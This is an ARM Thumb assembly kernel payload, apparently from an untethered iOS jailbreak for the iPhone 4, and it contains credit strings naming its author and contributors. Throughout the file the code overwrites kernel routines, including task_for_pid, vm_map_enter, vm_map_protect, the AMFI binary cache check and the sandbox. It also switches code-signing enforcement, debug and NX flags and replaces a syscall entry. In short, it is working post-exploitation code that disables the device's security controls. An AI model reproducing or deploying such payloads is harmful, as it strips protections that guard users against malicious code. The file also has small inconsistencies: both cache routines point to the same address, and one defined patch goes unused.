.globl _kernel_code_start
.globl _kernel_code_end

.thumb

#define LoadRegister(_Data, _Reg) \
    adr     _Reg, _Data     ;     \
    ldr     _Reg, [_Reg]

#define CallFunction(_Data)           \
    LoadRegister(_Data, r12)     ;    \
    blx     r12

#define Patch(_Offset, _Patch)        \
    LoadRegister(_Offset, r0)    ;    \
    LoadRegister(_Patch, r1)     ;    \
    str     r1, [r0]             ;    \
    nop                          ;    \
    nop                          ;    \
    nop


.align 4
_kernel_code_start:
    push    {lr}

    /* Print hello string. */
    adr     r0, _helloString
    CallFunction(_ioLogPtr)

    /* Kernel patch */
    Patch(_taskForPid0, _taskForPid0Patch)

    Patch(_vmMapEnterPtr, _vmMapEnterPatch)
    Patch(_vmMapProtectPtr, _vmMapProtectPatch)
    Patch(_amfiBinaryCache, _amfiBinaryCachePatch)
    Patch(_sandbox, _sandboxPatch)

    /* Fix up nx */
    LoadRegister(_nxEnabled, r0)
    movs    r1, #1
    strb    r1, [r0]

    LoadRegister(_csEnforcementPtr, r0)
    strb    r1, [r0]

    LoadRegister(_debugEnabled, r0)
    str     r1, [r0]

    LoadRegister(_procEnforce, r0)
    movs    r1, #0
    str     r1, [r0]

    /* Fix up sysent */
    Patch(_sysentCall0, _nosys)

    /* Flush and clear cache */
    movs    r0, #0
    CallFunction(_flushIcache)
    CallFunction(_clearDcache)

    /* We're done. */
    adr     r0, _hello2
    CallFunction(_ioLogPtr)

     /* Success */
    mov     r0, #0
    pop     {pc}

.align 4
_helloString:
    .asciz "WE R NOT #FAKR, UNTHREADEDJB IS REEL #I-PHONE 4XXXXX\n"
    .align 4
    .asciz "ADAMINSULL MADE THIS BINARY, <3"
    .align 4
_hello2:
    .asciz "tanks 2 @planetbeing n @posixninja n @chronicdev for #explot code in rkcy raccon :) :) :)\nkrnl patchs from @comex datautils))\n"
    .align 4
_ioLogPtr:
    .long (KERNEL_IOLOG)

/* kernel patches */
_csEnforcementPtr:
    .long KERNEL_CS_ENFORCEMENT_DISABLE    // offset

_vmMapEnterPtr:
    .long KERNEL_VM_MAP_ENTER    // offset
_vmMapEnterPatch:
    .long 0x46c00f02

_vmMapProtectPtr:
    .long KERNEL_VM_MAP_PROTECT
_vmMapProtectPatch:
    .long 0x46c046c0

_taskForPid0:
    .long KERNEL_TASK_FOR_PID    // offset
_taskForPid0Patch:
    .long 0xa802e00b

_PE_Debugger:
    .long KERNEL_PE_DEBUGGER    // offset
_PE_Debugger_Patch:
    .long 0x47702001    // movs r0, #1

_amfiBinaryCache:
    .long KERNEL_AMFI_BINARY_CACHE
_amfiBinaryCachePatch:
    .long 0x47702001

_sandbox:
    .long KERNEL_SANDBOX
_sandboxPatch:
    .long 0x23012031

_debugEnabled:
    .long KERNEL_DEBUG_ENABLED
_procEnforce:
    .long KERNEL_PROC_ENFORCE

_nxEnabled:
    .long   KERNEL_NX_ENABLE
_sysentCall0:
    .long   KERNEL_SYSCALL0
_nosys:
    .long   KERNEL_SYSCALL0_VALUE
_flushIcache:
    .long   KERNEL_FLUSH_DCACHE
_clearDcache:
    .long   KERNEL_FLUSH_DCACHE


.align 2
_kernel_code_end:
    nop

